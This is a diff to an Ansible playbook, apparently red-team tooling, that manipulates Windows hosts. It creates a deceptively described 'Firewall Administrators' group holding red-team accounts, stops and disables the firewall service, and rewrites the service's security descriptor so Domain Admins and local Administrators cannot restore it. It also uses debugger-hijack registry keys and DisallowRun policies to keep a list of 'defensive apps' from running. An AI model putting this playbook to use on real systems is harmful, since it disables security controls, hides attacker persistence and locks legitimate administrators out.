@@ -1,9 +1,30 @@
+- name: Create group
+  ansible.windows.win_group:
+    name: "Firewall Administrators"
+    description: "Managed by the Windows Firewall Service for kernel-level firewall administration"
+    state: present
+
+- name: Add user to group
+  ansible.windows.win_group_membership:
+    name: "Firewall Administrators"
+    members:
+      - "{{ redteam_local_all }}"
+    state: present
+
+- name: Get the SID of the new group
+  ansible.windows.win_shell: |
+    (Get-LocalGroup -Name "Firewall Administrators").SID.Value
+  register: group_sid
+
 - name: Disable Firewall Service
   # "mask" it by wiping the security descriptor so it can't be started via GUI
   ansible.windows.win_shell: |
     sc.exe stop MpsSvc
     sc.exe config MpsSvc start= disabled
-    sc.exe sdset MpsSvc D:(D;;DCLCWPDTSD;;;DA)(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCLCSWRPWPDTLOCRRC;;;BA)
+    $SDDL = "D:(A;;CCLCSWRPWPDTLOCRRC;;;{{ group_sid.stdout }})(A;;CCLCSWRPWPDTLOCRRC;;;SY)(D;;DCLCWPDTSD;;;DA)(D;;DCLCWPDTSD;;;BA)"
+    sc.exe sdset MpsSvc $SDDL
+  #sc.exe sdset MpsSvc 'D:(D;;DCLCWPDTSD;;;DA)(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCLCSWRPWPDTLOCRRC;;;BA)'
+  ignore_errors: true
   # ^ allow localsystem, block admin/domain admin
   # block localsystem and admin:
   #sc.exe sdset MpsSvc D:(D;;DCLCWPDTSD;;;SY)(D;;DCLCWPDTSD;;;BA)
@@ -14,7 +35,7 @@
     name: Debugger
     data: "ntsd.exe -c q"
     type: string
-  loop: "{{ block_list }}"
+  loop: "{{ windows_defensive_apps }}"
 
 - name: Set Explorer DisallowRun Policy
   ansible.windows.win_regedit:
@@ -22,6 +43,6 @@
     name: "{{ ansible_loop.index }}"
     data: "{{ item }}"
     type: string
-  loop: "{{ block_list }}"
+  loop: "{{ windows_defensive_apps }}"
   loop_control:
     extended: true # needed for index
